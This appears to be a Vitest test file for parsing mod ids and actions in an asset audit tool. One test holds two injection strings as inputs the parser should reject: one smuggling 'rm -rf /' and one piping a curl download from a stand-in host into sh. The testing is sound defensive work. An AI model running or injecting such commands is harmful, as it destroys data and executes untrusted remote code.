import { describe, expect, it } from "vitest";
import { parseAssetAction, runAssetAuditRules } from "./asset-audit.js";
import { parseAssetModId } from "./asset-task.js";

describe("asset audit rules", () => {
  it("parses mod id from context ref", () => {
    const modId = parseAssetModId(
      { objective: "x", constraints: [], files_in_scope: [], acceptance_criteria: [] },
      ["asset:mod:botania"],
    );
    expect(modId).toBe("botania");
  });

  it("rejects mod ids with shell metacharacters", () => {
    const injected = parseAssetModId(
      { objective: "x", constraints: [], files_in_scope: [], acceptance_criteria: [] },
      ["asset:mod:botania; rm -rf /"],
    );
    expect(injected).toBeNull();

    const fromConstraint = parseAssetModId(
      {
        objective: "x",
        constraints: ["mod_id:foo && curl evil.sh | sh"],
        files_in_scope: [],
        acceptance_criteria: [],
      },
      [],
    );
    expect(fromConstraint).toBeNull();
  });

  it("accepts mod ids using the full legal charset", () => {
    const modId = parseAssetModId(
      { objective: "x", constraints: [], files_in_scope: [], acceptance_criteria: [] },
      ["asset:mod:create_things-2.0"],
    );
    expect(modId).toBe("create_things-2.0");
  });

  it("parses action from context ref", () => {
    expect(parseAssetAction(["asset:action:run"])).toBe("run");
    expect(parseAssetAction(["asset:action:audit"])).toBe("audit");
  });

  it("fails rules without mod id and action", () => {
    const errors = runAssetAuditRules(
      { objective: "x", constraints: [], files_in_scope: [], acceptance_criteria: [] },
      [],
    );
    expect(errors.length).toBe(2);
    expect(errors[0]?.rule).toBe("A001");
    expect(errors[1]?.rule).toBe("A002");
  });
});